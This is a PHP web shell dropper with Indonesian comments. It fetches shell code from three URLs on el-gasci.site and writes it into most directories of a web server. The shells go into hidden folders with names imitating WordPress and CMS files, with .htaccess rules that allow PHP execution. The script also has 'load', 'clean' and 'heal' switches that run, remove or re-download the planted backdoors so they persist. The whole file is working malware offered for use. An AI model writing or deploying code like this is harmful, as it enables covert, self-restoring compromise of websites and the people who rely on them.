<?php
// dropper.php â€” Eksekusi backend dengan self-healing

$remote_urls = [
    'https://el-gasci.site/download/atomic.txt',
    'https://el-gasci.site/download/done.txt',
    'https://el-gasci.site/download/fox.txt'
];

$base_dir = __DIR__;
$log_file = __DIR__ . '/result.txt';

$natural_filenames = [
    'functions.php', 'admin-ajax.php', 'shortcodes.php', 'enqueue.php', 'template-tags.php',
    'helper.php', 'router.php', 'default.php', 'controller.php', 'view.html.php',
    'SubmissionHandler.inc.php', 'ArticleHandler.inc.php', 'LoginHandler.inc.php', 'UserHandler.inc.php',
    'startup.php', 'payment.php', 'shipping.php', 'total.php', 'voucher.php',
    'appLoader.php', 'reactEntry.php', 'appData.php', 'componentInit.php', 'renderUtils.php',
    'apiHandler.php', 'routeConfig.php', 'dbConnect.php', 'middleware.php', 'sessionInit.php',
    'tools.php', 'submitAction.php', 'formLoader.php', 'eventListener.php', 'ajaxHelper.php',
    'sanitize.php', 'userUtils.php', 'emailDispatcher.php', 'logger.php', 'tokenHandler.php'
];

$hidden_dir_names = [
    '.wp-json', '.wp-includes', '.modules', '.components', '.catalog',
    '.media', '.system', '.controller', '.plugin-cache', '.packages',
    '.assets', '.themes', '.views', '.libraries', '.includes',
    '.configs', '.scripts', '.handlers', '.api', '.routing'
];

function logPath($log_file, $message) {
    $timestamp = date('Y-m-d H:i:s');
    $formatted = "[$timestamp] $message\n";
    @file_put_contents($log_file, $formatted, FILE_APPEND | LOCK_EX);
}

function getAllValidDirs($base) {
    $dirs = [];
    $rii = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($rii as $file) {
        if ($file->isDir()) {
            $path = $file->getPathname();
            if (preg_match('#/(\.git|\.idea|vendor|node_modules)#i', $path)) continue;
            $dirs[] = $path;
        }
    }
    return array_unique($dirs);
}

function dropShell($remote_url, $target_dir, $log_file) {
    global $natural_filenames, $hidden_dir_names;

    $shell_code = @file_get_contents($remote_url);
    if (!$shell_code || strlen(trim($shell_code)) < 10) {
        $ch = curl_init($remote_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (ShellDropper)',
        ]);
        $shell_code = curl_exec($ch);
        curl_close($ch);
    }

    if (!$shell_code || strlen(trim($shell_code)) < 10) {
        logPath($log_file, "[ERROR] Gagal mengambil shell dari URL: $remote_url");
        return false;
    }

    $random_dir = $hidden_dir_names[array_rand($hidden_dir_names)];
    $hidden_dir = rtrim($target_dir, '/\\') . DIRECTORY_SEPARATOR . $random_dir;

    if (!is_dir($hidden_dir)) {
        if (!@mkdir($hidden_dir, 0755, true)) {
            logPath($log_file, "[DENIED] Tidak bisa membuat folder: $hidden_dir");
            return false;
        }
    }

    $htaccess_path = $hidden_dir . '/.htaccess';
    if (!file_exists($htaccess_path)) {
        @file_put_contents($htaccess_path, "Options -Indexes\n<FilesMatch \\.(php|inc)$>\nAllow from all\n</FilesMatch>\n");
    }

    $filename = $natural_filenames[array_rand($natural_filenames)];
    $fullpath = $hidden_dir . DIRECTORY_SEPARATOR . $filename;

    if (file_exists($fullpath)) {
        logPath($log_file, "[SKIP] File sudah ada: $fullpath");
        return false;
    }

    if (!is_writable($hidden_dir)) {
        logPath($log_file, "[DENIED] Tidak bisa menulis ke direktori: $hidden_dir");
        return false;
    }

    $result = @file_put_contents($fullpath, $shell_code);
    if ($result === false) {
        logPath($log_file, "[FAIL] Gagal menulis ke file: $fullpath");
        return false;
    }

    $real = realpath($fullpath);
    logPath($log_file, "[OK] Berhasil drop: $real");
    return $real;
}

function loadShells($log_file) {
    if (!file_exists($log_file)) return;
    foreach (file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\] (.+)$/', $line, $m)) {
            $path = trim($m[1]);
            if (is_file($path)) include_once $path;
        }
    }
}

function cleanShells($log_file) {
    if (!file_exists($log_file)) return;
    foreach (file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\] (.+)$/', $line, $m)) {
            $path = trim($m[1]);
            if (is_file($path)) @unlink($path);
        }
    }
    @unlink($log_file);
}

function healShells($log_file) {
    if (!file_exists($log_file)) return;
    foreach (file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\] (.+)$/', $line, $m)) {
            $path = trim($m[1]);
            if (!file_exists($path)) {
                $payload = @file_get_contents('https://el-gasci.site/download/atomic.txt');
                if ($payload && strlen(trim($payload)) > 10) {
                    @file_put_contents($path, $payload);
                }
            }
        }
    }
}

if (isset($_GET['load'])) { loadShells($log_file); exit; }
if (isset($_GET['clean'])) { cleanShells($log_file); exit; }
if (isset($_GET['heal'])) { healShells($log_file); exit; }

$dirs = getAllValidDirs($base_dir);
shuffle($dirs);

$total_targets = count($dirs);
$spread_count = (int) ceil($total_targets * 0.65);
$targets = array_slice($dirs, 0, $spread_count);
$total_urls = count($remote_urls);

$success = 0;
foreach ($targets as $i => $dir) {
    $url_index = $i % $total_urls;
    $remote_url = $remote_urls[$url_index];
    if (dropShell($remote_url, $dir, $log_file)) {
        $success++;
    }
}

header('Content-Type: application/json');
echo json_encode([
    'status' => 'ok',
    'success' => $success,
    'log_file' => basename($log_file),
]);
exit;
